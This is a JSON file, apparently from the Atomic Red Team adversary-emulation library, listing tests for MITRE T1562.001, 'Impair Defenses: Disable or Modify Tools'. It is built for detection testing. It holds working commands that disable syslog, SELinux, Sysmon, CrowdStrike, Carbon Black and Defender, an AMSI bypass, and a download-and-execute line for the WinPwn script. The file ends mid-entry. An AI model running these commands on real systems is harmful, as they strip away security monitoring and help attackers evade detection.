{
  "attack_technique": "T1562.001",
  "display_name": "Impair Defenses: Disable or Modify Tools",
  "atomic_tests": [
    {
      "name": "Disable syslog",
      "description": "Disables syslog collection",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "#{cleanup_command}",
        "procedure": "#{flavor_command}"
      },
      "input_arguments": [
        {
          "arg_name": "package_checker",
          "description": "Package checking command for linux.",
          "type": "string",
          "default": "(rpm -q rsyslog 2>&1 >/dev/null)"
        },
        {
          "arg_name": "package_installer",
          "description": "Package installer command for linux. Default yum",
          "type": "string",
          "default": "(which yum && yum -y install epel-release rsyslog)"
        },
        {
          "arg_name": "flavor_command",
          "description": "Command to disable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog",
          "type": "string",
          "default": "systemctl stop rsyslog ; systemctl disable rsyslog"
        },
        {
          "arg_name": "cleanup_command",
          "description": "Command to enable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog start ; chkconfig rsyslog on",
          "type": "string",
          "default": "systemctl start rsyslog ; systemctl enable rsyslog"
        }
      ],
      "dependencies": [
        {
          "description": "Package with rsyslog must be on system",
          "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi",
          "get_prereq_command": "sudo #{package_installer}"
        }
      ],
      "auto_generated_guid": "4ce786f8-e601-44b5-bfae-9ebb15a7d1c8"
    },
    {
      "name": "Disable syslog (freebsd)",
      "description": "Disables syslog collection",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "sysrc syslogd_enable=\"YES\"\nservice syslogd start",
        "procedure": "service syslogd stop\nsysrc syslogd_enable=\"NO\""
      },
      "input_arguments": [],
      "auto_generated_guid": "db9de996-441e-4ae0-947b-61b6871e2fdf"
    },
    {
      "name": "Disable Cb Response",
      "description": "Disable the Cb Response service",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "procedure": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi"
      },
      "input_arguments": [],
      "auto_generated_guid": "ae8943f7-0f8d-44de-962d-fbc2e2f03eb8"
    },
    {
      "name": "Disable SELinux",
      "description": "Disables SELinux enforcement",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "setenforce 1",
        "procedure": "setenforce 0"
      },
      "input_arguments": [],
      "dependencies": [
        {
          "description": "SELinux must be installed",
          "prereq_command": "which setenforce",
          "get_prereq_command": "echo \"SELinux is not installed\"; exit 1"
        }
      ],
      "auto_generated_guid": "fc225f36-9279-4c39-b3f9-5141ab74f8d8"
    },
    {
      "name": "Stop Crowdstrike Falcon on Linux",
      "description": "Stop and disable Crowdstrike Falcon on Linux",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "sudo systemctl enable falcon-sensor.service\nsudo systemctl start falcon-sensor.service",
        "procedure": "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service"
      },
      "input_arguments": [],
      "auto_generated_guid": "828a1278-81cc-4802-96ab-188bf29ca77d"
    },
    {
      "name": "Disable Carbon Black Response",
      "description": "Disables Carbon Black Response",
      "supported_platforms": [
        "macos"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist",
        "procedure": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist"
      },
      "input_arguments": [],
      "auto_generated_guid": "8fba7766-2d11-4b4a-979a-1e3d9cc9a88c"
    },
    {
      "name": "Disable LittleSnitch",
      "description": "Disables LittleSnitch",
      "supported_platforms": [
        "macos"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist",
        "procedure": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist"
      },
      "input_arguments": [],
      "auto_generated_guid": "62155dd8-bb3d-4f32-b31c-6532ff3ac6a3"
    },
    {
      "name": "Disable OpenDNS Umbrella",
      "description": "Disables OpenDNS Umbrella",
      "supported_platforms": [
        "macos"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist",
        "procedure": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist"
      },
      "input_arguments": [],
      "auto_generated_guid": "07f43b33-1e15-4e99-be70-bc094157c849"
    },
    {
      "name": "Disable macOS Gatekeeper",
      "description": "Disables macOS Gatekeeper",
      "supported_platforms": [
        "macos"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "sudo spctl --master-enable",
        "procedure": "sudo spctl --master-disable"
      },
      "input_arguments": [],
      "auto_generated_guid": "2a821573-fb3f-4e71-92c3-daac7432f053"
    },
    {
      "name": "Stop and unload Crowdstrike Falcon on macOS",
      "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS",
      "supported_platforms": [
        "macos"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl load -w #{falcond_plist}\nsudo launchctl load -w #{userdaemon_plist}",
        "procedure": "sudo launchctl unload #{falcond_plist}\nsudo launchctl unload #{userdaemon_plist}"
      },
      "input_arguments": [
        {
          "arg_name": "falcond_plist",
          "description": "The path of the Crowdstrike Falcon plist file",
          "type": "path",
          "default": "/Library/LaunchDaemons/com.crowdstrike.falcond.plist"
        },
        {
          "arg_name": "userdaemon_plist",
          "description": "The path of the Crowdstrike Userdaemon plist file",
          "type": "path",
          "default": "/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"
        }
      ],
      "auto_generated_guid": "b3e7510c-2d4c-4249-a33f-591a2bc83eef"
    },
    {
      "name": "Unload Sysmon Filter Driver",
      "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "sysmon -u -i > nul 2>&1\nsysmon -i -accepteula -i > nul 2>&1\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u > nul 2>&1\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i > nul 2>&1",
        "procedure": "fltmc.exe unload #{sysmon_driver}"
      },
      "input_arguments": [
        {
          "arg_name": "sysmon_driver",
          "description": "The name of the Sysmon filter driver (this can change from the default)",
          "type": "string",
          "default": "SysmonDrv"
        }
      ],
      "dependencies": [
        {
          "description": "Sysmon must be downloaded",
          "prereq_command": "if ((cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr /i Sysmon 2> nul\") -or (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\")) { exit 0 } else { exit 1 }",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\" -Force"
        },
        {
          "description": "sysmon must be Installed",
          "prereq_command": "if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }",
          "get_prereq_command": "if(cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") { C:\\Windows\\Sysmon.exe -accepteula -i } else\n{ & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i}"
        },
        {
          "description": "sysmon filter must be loaded",
          "prereq_command": "if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }",
          "get_prereq_command": "if(Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\"){\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i\n}else{\n  sysmon -u\n  sysmon -accepteula -i\n}"
        }
      ],
      "dependency_executor_name": "powershell",
      "auto_generated_guid": "811b3e76-c41b-430c-ac0d-e2380bfaa164"
    },
    {
      "name": "Uninstall Sysmon",
      "description": "Uninstall Sysinternals Sysmon for Defense Evasion",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "sysmon -i -accepteula >nul 2>&1",
        "procedure": "sysmon -u"
      },
      "input_arguments": [
        {
          "arg_name": "sysmon_exe",
          "description": "The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)",
          "type": "path",
          "default": "PathToAtomicsFolder\\T1562.001\\bin\\sysmon.exe"
        }
      ],
      "dependencies": [
        {
          "description": "Sysmon executable must be available",
          "prereq_command": "if(cmd /c where sysmon) {exit 0} else {exit 1}",
          "get_prereq_command": "$parentpath = Split-Path \"#{sysmon_exe}\"; $zippath = \"$parentpath\\Sysmon.zip\"\nNew-Item -ItemType Directory $parentpath -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$zippath\"\nExpand-Archive $zippath $parentpath -Force; Remove-Item $zippath\nif(-not ($Env:Path).contains($parentpath)){$Env:Path += \";$parentpath\"}"
        },
        {
          "description": "Sysmon must be installed",
          "prereq_command": "if(cmd /c sc query sysmon) { exit 0} else { exit 1}",
          "get_prereq_command": "cmd /c sysmon -i -accepteula"
        }
      ],
      "dependency_executor_name": "powershell",
      "auto_generated_guid": "a316fb2e-5344-470d-91c1-23e15c374edc"
    },
    {
      "name": "AMSI Bypass - AMSI InitFailed",
      "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)",
        "procedure": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
      },
      "input_arguments": [],
      "auto_generated_guid": "695eed40-e949-40e5-b306-b4031e4154bd"
    },
    {
      "name": "AMSI Bypass - Remove AMSI Provider Reg Key",
      "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null",
        "procedure": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse"
      },
      "input_arguments": [],
      "auto_generated_guid": "13f09b91-c953-438e-845b-b585e51cac9b"
    },
    {
      "name": "Disable Arbitrary Security Windows Service",
      "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "sc.exe config #{service_name} start= auto >nul 2>&1\nnet.exe start #{service_name} >nul 2>&1",
        "procedure": "net.exe stop #{service_name}\nsc.exe config #{service_name} start= disabled"
      },
      "input_arguments": [
        {
          "arg_name": "service_name",
          "description": "The name of the service to stop",
          "type": "string",
          "default": "McAfeeDLPAgentService"
        }
      ],
      "auto_generated_guid": "a1230893-56ac-4c81-b644-2108e982f8f5"
    },
    {
      "name": "Tamper with Windows Defender ATP PowerShell",
      "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Set-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableScriptScanning 0\nSet-MpPreference -DisableBlockAtFirstSeen 0",
        "procedure": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1"
      },
      "input_arguments": [],
      "auto_generated_guid": "6b8df440-51ec-4d53-bf83-899591c9b5d7"
    },
    {
      "name": "Tamper with Windows Defender Command Prompt",
      "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "sc start WinDefend >nul 2>&1\nsc config WinDefend start=enabled >nul 2>&1",
        "procedure": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend"
      },
      "input_arguments": [],
      "auto_generated_guid": "aa875ed4-8935-47e2-b2c5-6ec00ab220d2"
    },
    {
      "name": "Tamper with Windows Defender Registry",
      "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0",
        "procedure": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1"
      },
      "input_arguments": [],
      "auto_generated_guid": "1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45"
    },
    {
      "name": "Disable Microsoft Office Security Features",
      "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore",
        "procedure": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\""
      },
      "input_arguments": [],
      "auto_generated_guid": "6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7"
    },
    {
      "name": "Remove Windows Defender Definition Files",
      "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "procedure": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All"
      },
      "input_arguments": [],
      "auto_generated_guid": "3d47daaa-2f56-43e0-94cc-caf5d8d52a68"
    },
    {
      "name": "Stop and Remove Arbitrary Security Windows Service",
      "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "Stop-Service -Name #{service_name}\nRemove-Service -Name #{service_name}"
      },
      "input_arguments": [
        {
          "arg_name": "service_name",
          "description": "The name of the service to remove",
          "type": "string",
          "default": "McAfeeDLPAgentService"
        }
      ],
      "auto_generated_guid": "ae753dda-0f15-4af6-a168-b9ba16143143"
    },
    {
      "name": "Uninstall Crowdstrike Falcon on Windows",
      "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "if (Test-Path \"#{falcond_path}\") {. \"#{falcond_path}\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}"
      },
      "input_arguments": [
        {
          "arg_name": "falcond_path",
          "description": "The Crowdstrike Windows Sensor path. The Guid always changes.",
          "type": "path",
          "default": "C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe"
        }
      ],
      "auto_generated_guid": "b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297"
    },
    {
      "name": "Tamper with Windows Defender Evade Scanning -Folder",
      "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "$excludedpath= \"#{excluded_folder}\"\nRemove-MpPreference -ExclusionPath $excludedpath",
        "procedure": "$excludedpath= \"#{excluded_folder}\"\nAdd-MpPreference -ExclusionPath $excludedpath"
      },
      "input_arguments": [
        {
          "arg_name": "excluded_folder",
          "description": "This folder will be excluded from scanning",
          "type": "path",
          "default": "C:\\Temp"
        }
      ],
      "auto_generated_guid": "0b19f4ee-de90-4059-88cb-63c800c683ed"
    },
    {
      "name": "Tamper with Windows Defender Evade Scanning -Extension",
      "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "$excludedExts= \"#{excluded_exts}\"\nRemove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore",
        "procedure": "$excludedExts= \"#{excluded_exts}\"\nAdd-MpPreference -ExclusionExtension  $excludedExts"
      },
      "input_arguments": [
        {
          "arg_name": "excluded_exts",
          "description": "A list of extension to exclude from scanning",
          "type": "string",
          "default": ".exe"
        }
      ],
      "auto_generated_guid": "315f4be6-2240-4552-b3e1-d1047f5eecea"
    },
    {
      "name": "Tamper with Windows Defender Evade Scanning -Process",
      "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "$excludedProcess = \"#{excluded_process}\"\nRemove-MpPreference -ExclusionProcess  $excludedProcess",
        "procedure": "$excludedProcess = \"#{excluded_process}\"\nAdd-MpPreference -ExclusionProcess $excludedProcess"
      },
      "input_arguments": [
        {
          "arg_name": "excluded_process",
          "description": "A list of processes to exclude from scanning",
          "type": "string",
          "default": "outlook.exe"
        }
      ],
      "auto_generated_guid": "a123ce6a-3916-45d6-ba9c-7d4081315c27"
    },
    {
      "name": "office-365-Disable-AntiPhishRule",
      "description": "Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.",
      "supported_platforms": [
        "office-365"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "if(\"#{password}\" -ne \"\") {\n$secure_pwd = (\"#{password}\" + \"\") | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nEnable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n}",
        "procedure": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nDisable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule"
      },
      "input_arguments": [
        {
          "arg_name": "username",
          "description": "office-365 username",
          "type": "string",
          "default": null
        },
        {
          "arg_name": "password",
          "description": "office-365 password",
          "type": "string",
          "default": null
        }
      ],
      "dependencies": [
        {
          "description": "ExchangeOnlineManagement PowerShell module must be installed",
          "prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}",
          "get_prereq_command": "Install-Module -Name ExchangeOnlineManagement\nImport-Module ExchangeOnlineManagement"
        }
      ],
      "auto_generated_guid": "b9bbae2c-2ba6-4cf3-b452-8e8f908696f3"
    },
    {
      "name": "Disable Windows Defender with DISM",
      "description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "procedure": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet"
      },
      "input_arguments": [],
      "auto_generated_guid": "871438ac-7d6e-432a-b27d-3e7db69faf58"
    },
    {
      "name": "Disable Defender Using NirSoft AdvancedRun",
      "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}",
        "procedure": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(#{delete_defender_folder}){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}"
      },
      "input_arguments": [
        {
          "arg_name": "AdvancedRun_Location",
          "description": "Path of Advanced Run executable",
          "type": "path",
          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe"
        },
        {
          "arg_name": "delete_defender_folder",
          "description": "Set to 1 to also delete the Windows Defender folder",
          "type": "integer",
          "default": "0"
        }
      ],
      "dependencies": [
        {
          "description": "Advancedrun.exe must exist at #{AdvancedRun_Location}",
          "prereq_command": "if(Test-Path -Path \"#{AdvancedRun_Location}\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"http://www.nirsoft.net/utils/advancedrun.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\advancedrun.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -Force"
        }
      ],
      "auto_generated_guid": "81ce22fd-9612-4154-918e-8a1f285d214d"
    },
    {
      "name": "Kill antimalware protected processes using Backstab",
      "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n #{process_name}"
      },
      "input_arguments": [
        {
          "arg_name": "process_name",
          "description": "Name of the protected process you want to kill/terminate.",
          "type": "string",
          "default": "MsMpEng.exe"
        }
      ],
      "dependencies": [
        {
          "description": "Backstab64.exe should exist in ExtrnalPayloads Directory",
          "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\") {exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\""
        }
      ],
      "auto_generated_guid": "24a12b91-05a7-4deb-8d7f-035fa98591bc"
    },
    {
      "name": "WinPwn - Kill the event log services for stealth",
      "description": "Kill the event log services for stealth via function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ninv-phantom -consoleoutput -noninteractive"
      },
      "input_arguments": [],
      "auto_generated_guid": "7869d7a3-3a30-4d2c-a5d2-f1cd9c34ce66"
    },
    {
      "name": "Tamper with Windows Defender ATP using Aliases - PowerShell",
      "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Set-MpPreference -drtm 0\nSet-MpPreference -dbm 0\nSet-MpPreference -dscrptsc 0\nSet-MpPreference -dbaf 0",
        "procedure": "Set-MpPreference -drtm $True\nSet-MpPreference -dbm $True\nSet-MpPreference -dscrptsc $True\nSet-MpPreference -dbaf $True"
      },
      "input_arguments": [],
      "auto_generated_guid": "c531aa6e-9c97-4b29-afee-9b7be6fc8a64"
    },
    {
